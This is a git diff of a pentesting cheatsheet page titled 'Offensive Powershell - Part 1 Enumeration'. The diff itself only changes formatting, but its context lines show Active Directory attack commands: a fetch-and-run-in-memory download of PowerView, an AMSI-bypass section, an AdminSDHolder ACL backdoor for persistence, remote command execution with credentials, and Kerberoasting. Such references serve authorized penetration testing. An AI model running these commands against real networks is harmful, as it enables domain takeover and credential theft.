@@ -1,39 +1,38 @@
 ---
-layout: default
+layout: post
 title: Offensive Powershell - Part 1 Enumeration  
 parent: Pentesting
-categories: Pentesting Windows
+category: Pentesting
 grand_parent: Cheatsheets
 has_children: true
-last-modified: 2021-11-17
+modified_date: 2021-11-17
 ---
-# {{ page.title}}
 
 <!-- vscode-markdown-toc -->
-* 1. [AV Evasion 101 by S3cur3Th1sSh1t](#AVEvasion101byS3cur3Th1sSh1t)
-* 2. [PRE-REQUISITE: Installing PowerView](#PRE-REQUISITE:InstallingPowerView)
-* 3. [PRE-REQUISITE: AD Web Services on the DC](#PRE-REQUISITE:ADWebServicesontheDC)
-* 4. [ENUM: DOMAIN ADMIN](#ENUM:DOMAINADMIN)
-* 5. [ENUM: PRIVILEGED USERS](#ENUM:PRIVILEGEDUSERS)
-* 6. [ENUM: DOMAIN](#ENUM:DOMAIN)
-* 7. [ENUM: DOMAIN PERSISTENCY](#ENUM:DOMAINPERSISTENCY)
-* 8. [ENUM: FOREST PRIVESC](#ENUM:FORESTPRIVESC)
-* 9. [ENUM: SERVICES LOOTS](#ENUM:SERVICESLOOTS)
-* 10. [ENUM: Kerberoasting](#ENUM:Kerberoasting)
-* 11. [MISC](#MISC)
+* [AV Evasion 101 by S3cur3Th1sSh1t](#AVEvasion101byS3cur3Th1sSh1t)
+* [PRE-REQUISITE: Installing PowerView](#PRE-REQUISITE:InstallingPowerView)
+* [PRE-REQUISITE: AD Web Services on the DC](#PRE-REQUISITE:ADWebServicesontheDC)
+* [ENUM: DOMAIN ADMIN](#ENUM:DOMAINADMIN)
+* [ENUM: PRIVILEGED USERS](#ENUM:PRIVILEGEDUSERS)
+* [ENUM: DOMAIN](#ENUM:DOMAIN)
+* [ENUM: DOMAIN PERSISTENCY](#ENUM:DOMAINPERSISTENCY)
+* [ENUM: FOREST PRIVESC](#ENUM:FORESTPRIVESC)
+* [ENUM: SERVICES LOOTS](#ENUM:SERVICESLOOTS)
+* [ENUM: Kerberoasting](#ENUM:Kerberoasting)
+* [MISC](#MISC)
 
 <!-- vscode-markdown-toc-config
-	numbering=true
+	numbering=false
 	autoSave=true
 	/vscode-markdown-toc-config -->
 <!-- /vscode-markdown-toc -->
 
-##  1. <a name='AVEvasion101byS3cur3Th1sSh1t'></a>AV Evasion 101 by S3cur3Th1sSh1t
+## <a name='AVEvasion101byS3cur3Th1sSh1t'></a>AV Evasion 101 by S3cur3Th1sSh1t
 
 <iframe width="727" height="409" src="https://www.youtube.com/embed/_sPM9Er_194" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
 
 
-##  2. <a name='PRE-REQUISITE:InstallingPowerView'></a>PRE-REQUISITE: Installing PowerView
+## <a name='PRE-REQUISITE:InstallingPowerView'></a>PRE-REQUISITE: Installing PowerView
 
 - [PowerView CheatSheet](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
 # Bypass AMSI 
@@ -60,7 +59,7 @@ IEX($content)
 # PowerView Module
 iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1');New-InMemoryModule
 ```
-##  3. <a name='PRE-REQUISITE:ADWebServicesontheDC'></a>PRE-REQUISITE: AD Web Services on the DC
+## <a name='PRE-REQUISITE:ADWebServicesontheDC'></a>PRE-REQUISITE: AD Web Services on the DC
 
 On the error below when loading the AD module, ADWS must be reachable and running:
 - TCP port 9389 reachable from your endpoint (and listening on the DC) : ```Test-NetConnection DC01 -port 9389```
@@ -74,7 +73,7 @@ AVERTISSEMENT : Error initializing default drive: 'Unable to find a default ser
 For more info, read the article from [theitbros.om](
 https://theitbros.com/unable-to-find-a-default-server-with-active-directory-web-services-running/).
 
-##  4. <a name='ENUM:DOMAINADMIN'></a>ENUM: DOMAIN ADMIN
+## <a name='ENUM:DOMAINADMIN'></a>ENUM: DOMAIN ADMIN
 ```powershell
 # PowerView: find where DA has logged on / and current user has access
 Invoke-UserHunter
@@ -87,7 +86,7 @@ Get-DomainGroupMember -Identity "Domain Admins" -Recurse | select membername, me
 Get-DomainGroupMember -Identity "Enterprise Admins" -Recurse -Domain <Forest> | select membername, membersid
 ```
 
-##  5. <a name='ENUM:PRIVILEGEDUSERS'></a>ENUM: PRIVILEGED USERS
+## <a name='ENUM:PRIVILEGEDUSERS'></a>ENUM: PRIVILEGED USERS
 
 - [Well-known Microsoft SID List](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab?redirectedfrom=MSDN)
 
@@ -138,7 +137,7 @@ $mycreds = New-Object System.Management.Automation.PSCredential("<sogreat>", (ne
 Invoke-Command -Credential $mycreds -ComputerName <Computer> -ScriptBlock {whoami; hostname}
 ```
 
-##  6. <a name='ENUM:DOMAIN'></a>ENUM: DOMAIN
+## <a name='ENUM:DOMAIN'></a>ENUM: DOMAIN
 
 ```powershell
 Get-NetDomainController
@@ -204,7 +203,7 @@ Get-DomainObjectAcl "dc=dev,dc=<Domain>,dc=local" -ResolveGUIDs | ? {
 }
 ```
 
-##  7. <a name='ENUM:DOMAINPERSISTENCY'></a>ENUM: DOMAIN PERSISTENCY
+## <a name='ENUM:DOMAINPERSISTENCY'></a>ENUM: DOMAIN PERSISTENCY
 
 ```powershell
 # enumerate who has rights to the 'matt' user in '<Domain>.local', resolving rights GUIDs to names
@@ -220,7 +219,7 @@ Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=<Domain>,DC=local
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<Domain>,DC=local' -PrincipalIdentity matt -Rights All/
 ```
 
-##  8. <a name='ENUM:FORESTPRIVESC'></a>ENUM: FOREST PRIVESC
+## <a name='ENUM:FORESTPRIVESC'></a>ENUM: FOREST PRIVESC
 
 ```powershell
 # get the trusts of the current domain/forest
@@ -245,7 +244,7 @@ Find-DomainUserLocation -ComputerUnconstrained -ShowAll
 Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation
 ```
 
-##  9. <a name='ENUM:SERVICESLOOTS'></a>ENUM: SERVICES LOOTS
+## <a name='ENUM:SERVICESLOOTS'></a>ENUM: SERVICES LOOTS
 
 ```powershell
 # find all users with an SPN set (likely service accounts)
@@ -271,7 +270,7 @@ Get-NetComputer -OperatingSystem "Windows 2008*" -Ping
 
 ```
 
-##  10. <a name='ENUM:Kerberoasting'></a>ENUM: Kerberoasting
+## <a name='ENUM:Kerberoasting'></a>ENUM: Kerberoasting
 
 ```powershell
 # get the last password set of each user in the current domain
@@ -289,7 +288,7 @@ Get-DomainUser -UACFilter DONT_REQ_PREAUTH
 Invoke-Kerberoast -SearchBase "LDAP://OU=secret,DC=<Domain>,DC=local"
 ```
 
-##  11. <a name='MISC'></a>MISC
+## <a name='MISC'></a>MISC
 
 ```powershell
 # get all the groups a user is effectively a member of, 'recursing up' using tokenGroups
